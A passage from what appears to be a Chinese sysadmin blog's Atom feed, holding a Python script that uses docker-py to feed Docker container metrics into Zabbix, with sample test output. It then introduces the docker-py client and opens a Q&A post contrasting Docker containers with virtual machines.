item == <span class="string">'mem_percent'</span>:</span><br><span class="line">            <span class="keyword">return</span> round(float(stats[<span class="string">'memory_stats'</span>][<span class="string">'stats'</span>][<span class="string">'total_rss'</span>])/float(stats[<span class="string">'memory_stats'</span>][<span class="string">'limit'</span>])*<span class="number">100.0</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_networks</span><span class="params">(self, container, item)</span>:</span></span><br><span class="line">        stats = self.docker_stats(container)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">           stats[<span class="string">'networks'</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>] !=[]:</span><br><span class="line">           tx_packets1 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'tx_packets'</span>]</span><br><span class="line">           tx_bytes1 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'tx_bytes'</span>]</span><br><span class="line">           rx_packets1 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'rx_packets'</span>]</span><br><span class="line">           rx_bytes1 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'rx_bytes'</span>]</span><br><span class="line">           stats = self.docker_stats(container)</span><br><span class="line">           tx_packets2 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'tx_packets'</span>]</span><br><span class="line">           tx_bytes2 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'tx_bytes'</span>]</span><br><span class="line">           rx_packets2 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'rx_packets'</span>]</span><br><span class="line">           rx_bytes2 = stats[<span class="string">'networks'</span>][<span class="string">'eth0'</span>][<span class="string">'rx_bytes'</span>]</span><br><span class="line">        <span class="keyword">elif</span> stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>] !=[]:</span><br><span class="line">           tx_packets1 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'tx_packets'</span>]</span><br><span class="line">           tx_bytes1 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'tx_bytes'</span>]</span><br><span class="line">           rx_packets1 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'rx_packets'</span>]</span><br><span class="line">           rx_bytes1 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'rx_bytes'</span>]</span><br><span class="line">           stats = self.docker_stats(container)</span><br><span class="line">           tx_packets2 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'tx_packets'</span>]</span><br><span class="line">           tx_bytes2 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'tx_bytes'</span>]</span><br><span class="line">           rx_packets2 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'rx_packets'</span>]</span><br><span class="line">           rx_bytes2 = stats[<span class="string">'networks'</span>][<span class="string">'bond0'</span>][<span class="string">'rx_bytes'</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"networks"</span> <span class="keyword">in</span> stats:</span><br><span class="line">           <span class="keyword">if</span> item == <span class="string">"tx_packets"</span>:</span><br><span class="line">                <span class="keyword">return</span> abs(tx_packets2 - tx_packets1)</span><br><span class="line">           <span class="keyword">elif</span> item == <span class="string">"tx_bytes"</span>:</span><br><span class="line">               <span class="keyword">return</span> abs(tx_bytes2 - tx_bytes1)</span><br><span class="line">           <span class="keyword">elif</span> item == <span class="string">"rx_packets"</span>:</span><br><span class="line">               <span class="keyword">return</span> abs(rx_packets2 - rx_packets1)</span><br><span class="line">           <span class="keyword">elif</span> item == <span class="string">"rx_bytes"</span>:</span><br><span class="line">               <span class="keyword">return</span> abs(rx_bytes2 - rx_bytes1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_exec</span><span class="params">(self, container, cmd)</span>:</span></span><br><span class="line">        client = docker.from_env()</span><br><span class="line">        thread = <span class="string">"cat /proc/[0-9]*/status |grep Threads:|awk '&#123;sum += $2&#125;;END &#123;print sum&#125;'"</span></span><br><span class="line">        fileopen = <span class="string">"find /proc/[0-9]* -type f 2&gt;/dev/null|wc -l"</span></span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">"thread"</span>:</span><br><span class="line">            cmd = thread</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">"fileopen"</span>:</span><br><span class="line">            cmd = fileopen</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = client.containers.get(container).exec_run([<span class="string">'sh'</span>, <span class="string">'-c'</span>, cmd], stdin=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_run</span><span class="params">(self, dockerimage, containername, cmd)</span>:</span></span><br><span class="line">        client = docker.from_env()</span><br><span class="line">        result = client.containers.run(image=dockerimage,stdin_open=<span class="keyword">True</span>,tty=<span class="keyword">True</span>,command=cmd,name=containername,detach=<span class="keyword">True</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">docker_blkio</span><span class="params">(self, container, item)</span>:</span></span><br><span class="line">        stats = self.docker_stats(container)</span><br><span class="line">        blkio_bytes_stats = json.dumps(stats[<span class="string">'blkio_stats'</span>][<span class="string">'io_service_bytes_recursive'</span>])</span><br><span class="line">        blkio_ops_stats = json.dumps(stats[<span class="string">'blkio_stats'</span>][<span class="string">'io_serviced_recursive'</span>])</span><br><span class="line">        <span class="keyword">if</span> stats[<span class="string">'blkio_stats'</span>][<span class="string">'io_serviced_recursive'</span>] !=[] <span class="keyword">and</span> stats[<span class="string">'blkio_stats'</span>][<span class="string">'io_serviced_recursive'</span>] !=[]:</span><br><span class="line">           <span class="keyword">if</span> item == <span class="string">"blkio_stats"</span>:</span><br><span class="line">               <span class="keyword">return</span> stats[<span class="string">'blkio_stats'</span>]</span><br><span class="line">           <span class="keyword">elif</span> item == <span class="string">"io_bytes_read"</span>:</span><br><span class="line">               <span class="keyword">return</span> str(str(blkio_bytes_stats)).split(<span class="string">'value\":'</span>)[<span class="number">1</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</span><br><span class="line">           <span class="keyword">elif</span> item == <span class="string">"io_bytes_write"</span>:</span><br><span class="line">               <span class="keyword">return</span> str(str(blkio_bytes_stats)).split(<span class="string">'value\":'</span>)[<span class="number">2</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</span><br><span class="line">           <span class="keyword">elif</span> item == <span class="string">"io_ops_read"</span>:</span><br><span class="line">               <span class="keyword">return</span> str(str(blkio_ops_stats)).split(<span class="string">'value\":'</span>)[<span class="number">1</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</span><br><span class="line">           <span class="keyword">elif</span> item == <span class="string">"io_ops_write"</span>:</span><br><span class="line">               <span class="keyword">return</span> str(str(blkio_ops_stats)).split(<span class="string">'value\":'</span>)[<span class="number">2</span>].split(<span class="string">","</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dockerService = DockerService()</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> usage.__doc__</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.version"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_version()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.discovery"</span>:</span><br><span class="line">        dockerService.docker_discovery()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.up"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_up(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.mem"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_mem(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.cpu"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_cpu(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.stats"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_networks(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.exec"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_exec(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.run"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_run(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>], sys.argv[<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"docker.blkio"</span>:</span><br><span class="line">        <span class="keyword">print</span> dockerService.docker_blkio(sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p><strong>脚本测试</strong></p><p>查看docker版本号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./zabbix_module_docker.py docker.version <span class="comment">#输出docker版本号</span></span><br><span class="line">17.09.0-ce</span><br></pre></td></tr></table></figure><p>运行一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./zabbix_module_docker.py docker.run centos:7 <span class="built_in">test</span>-container /bin/bash <span class="comment">#用centos:7镜像run运行一个名称为test-container的容器</span></span><br><span class="line">&lt;Container: f04ebe73eb&gt;</span><br></pre></td></tr></table></figure><p>Discovery当前物理机上的容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./zabbix_module_docker.py docker.discovery <span class="comment">#discovery当前物理机上的容器情况</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">"data"</span>:[</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="string">"&#123;#CONTAINERNAME&#125;"</span>:<span class="string">"test-container"</span>,</span><br><span class="line">                <span class="string">"&#123;#CONTAINERID&#125;"</span>:<span class="string">"f04ebe73eb94305f27a14cee01495cf9fc3f10fd101127956b06d1cd1413d914"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看容器状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./zabbix_module_docker.py docker.up <span class="built_in">test</span>-container <span class="comment">#查看test-container容器当前状态，1代表up，0代表退出状态。</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>结合zabbix可以用来自动发现实现批量监控docker容器，当然需要配置自定义zabbix监控项，可以通过配置zabbix监控模版关联主机。更详细的配置实现方式就不写了，网上有很多相关教程。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Docker-client-for-python&quot;&gt;&lt;a href=&quot;#Docker-client-for-python&quot; class=&quot;headerlink&quot; title=&quot;Docker-client for python&quot;&gt;&lt;/a&gt;Docker-client for python&lt;/h2&gt;&lt;h3 id=&quot;简易安装&quot;&gt;&lt;a href=&quot;#简易安装&quot; class=&quot;headerlink&quot; title=&quot;简易安装&quot;&gt;&lt;/a&gt;简易安装&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install docker-py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;客户端初始化的三种方法&quot;&gt;&lt;a href=&quot;#客户端初始化的三种方法&quot; class=&quot;headerlink&quot; title=&quot;客户端初始化的三种方法&quot;&gt;&lt;/a&gt;客户端初始化的三种方法&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; docker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker.api()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker.APIClient()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker.client()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker.DockerClient() &lt;span class=&quot;comment&quot;&gt;#其实也是docker.client()的一个子集&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker.from_env() &lt;span class=&quot;comment&quot;&gt;#其实就是docker.client()的一个子集&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;简单测试&quot;&gt;&lt;a href=&quot;#简单测试&quot; class=&quot;headerlink&quot; title=&quot;简单测试&quot;&gt;&lt;/a&gt;简单测试&lt;/h3&gt;&lt;h4 id=&quot;查看docker版本号&quot;&gt;&lt;a href=&quot;#查看docker版本号&quot; class=&quot;headerlink&quot; title=&quot;查看docker版本号&quot;&gt;&lt;/a&gt;查看docker版本号&lt;/h4&gt;&lt;p&gt;等同于执行&lt;code&gt;docker version&lt;/code&gt;命令&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ yum -y install ipython&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ ipython&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;In [1]: import docker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;In [2]: client = docker.APIClient(base_url=&lt;span class=&quot;string&quot;&gt;&#39;unix://var/run/docker.sock&#39;&lt;/span&gt;,version=&lt;span class=&quot;string&quot;&gt;&#39;auto&#39;&lt;/span&gt;,timeout=5)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;In [3]: client.version()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Out[3]: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;u&lt;span class=&quot;string&quot;&gt;&#39;ApiVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;1.35&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;Arch&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;amd64&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;BuildTime&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;2017-12-27T20:12:46.000000000+00:00&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;Components&#39;&lt;/span&gt;: [&amp;#123;u&lt;span class=&quot;string&quot;&gt;&#39;Details&#39;&lt;/span&gt;: &amp;#123;u&lt;span class=&quot;string&quot;&gt;&#39;ApiVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;1.35&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;Arch&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;amd64&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;BuildTime&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;2017-12-27T20:12:46.000000000+00:00&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;Experimental&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;false&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;GitCommit&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;c97c6d6&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;GoVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;go1.9.2&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;KernelVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;4.11.1-1.el7.elrepo.x86_64&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;MinAPIVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;1.12&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    u&lt;span class=&quot;string&quot;&gt;&#39;Os&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;linux&#39;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   u&lt;span class=&quot;string&quot;&gt;&#39;Name&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;Engine&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   u&lt;span class=&quot;string&quot;&gt;&#39;Version&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;17.12.0-ce&#39;&lt;/span&gt;&amp;#125;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;GitCommit&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;c97c6d6&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;GoVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;go1.9.2&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;KernelVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;4.11.1-1.el7.elrepo.x86_64&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;MinAPIVersion&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;1.12&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;Os&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;linux&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;Platform&#39;&lt;/span&gt;: &amp;#123;u&lt;span class=&quot;string&quot;&gt;&#39;Name&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; u&lt;span class=&quot;string&quot;&gt;&#39;Version&#39;&lt;/span&gt;: u&lt;span class=&quot;string&quot;&gt;&#39;17.12.0-ce&#39;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;docker.APIClient&lt;/code&gt; 中部分相关参数说明&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Args:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   base_url (str): 指定链接路径，可以通过socket或者tcp方式链接``unix:///var/run/docker.sock`` or ``tcp://127.0.0.1:1234``&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   version (str): 指定API使用的版本(docker=2.0.0默认的api版本是1.24,最低支持1.21,docker1.9+的api是1.21),因此在使用python的docker模块时一定要注意docker的api以及docker模块的api是否兼容。当然如果设置为 ``auto`` 会去自动检测server的版本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   timeout (int): 使用API调用的默认超时时间，默认单位为秒&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Docker" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Docker/"/>
    
    
      <category term="Docker" scheme="https://linux7788.com/tags/Docker/"/>
    
      <category term="python" scheme="https://linux7788.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>关于Docker的50个问与答</title>
    <link href="https://linux7788.com/docker/Docker_question/"/>
    <id>https://linux7788.com/docker/Docker_question/</id>
    <published>2018-04-26T02:32:25.000Z</published>
    <updated>2018-05-18T15:32:58.965Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问：Docker-和-传统的虚拟机有什么差别？"><a href="#问：Docker-和-传统的虚拟机有什么差别？" class="headerlink" title="问：Docker 和 传统的虚拟机有什么差别？"></a>问：Docker 和 传统的虚拟机有什么差别？</h2><p><strong>答：</strong> 我们知道inux系统将自身划分为两部分，一部分为核心软件，也称作内核空间(<code>kernel</code>)，另一部分为普通应用程序，这部分称为用户空间(<code>userland</code>)。<br>容器内的进程是直接运行于宿主内核的，这点和宿主进程一致，只是容器的 <code>userland</code> 不同，容器的 <code>userland</code> 由容器镜像提供，也就是说镜像提供了 <code>rootfs</code>。<br>假设宿主是 <code>Ubuntu</code>，容器是 <code>CentOS</code>。<code>CentOS</code> 容器中的进程会直接向 <code>Ubuntu</code> 宿主内核发送 <code>syscall</code>，而不会直接或间接的使用任何 <code>Ubuntu</code> 的 <code>userland</code> 的库。<br>这点和虚拟机有本质的不同，虚拟机是虚拟环境，在现有系统上虚拟一套物理设备，然后在虚拟环境内运行一个虚拟环境的操作系统内核，在内核之上再跑完整系统，并在里面调用进程。<br>还以上面的例子去考虑，虚拟机中，<code>CentOS</code> 的进程发送 <code>syscall</code> 内核调用，该请求会被虚拟机内的 <code>CentOS</code> 的内核接到，然后 <code>CentOS</code> 内核访问虚拟硬件时，由虚拟机的服务软件截获，并使用宿主系统，也就是 <code>Ubuntu</code> 的内核及 <code>userland</code> 的库去执行。<br>而且，Linux 和 Windows 在这点上非常不同。Linux 的进程是直接发 <code>syscall</code> 的，而 Windows 则把 <code>syscall</code> 隐藏于一层层的 <code>DLL</code> 服务之后，因此 Windows 的任何一个进程如果要执行，不仅仅需要 Windows 内核，还需要一群服务来支撑，所以如果 Windows 要实现类似的机制，容器内将不会像 Linux 这样轻量级，而是非常臃肿。看一下微软移植的 Docker 就非常清楚了。<br>所以不要把 Docker 和虚拟机弄混，Docker 容器只是一个进程而已，只不过利用镜像提供的 <code>rootfs</code> 提供了调用所需的 <code>userland</code> 库支持，使得进程可以在受控环境下运行而已，它并没有虚拟出一个机器出来。</p><p><strong>Linux 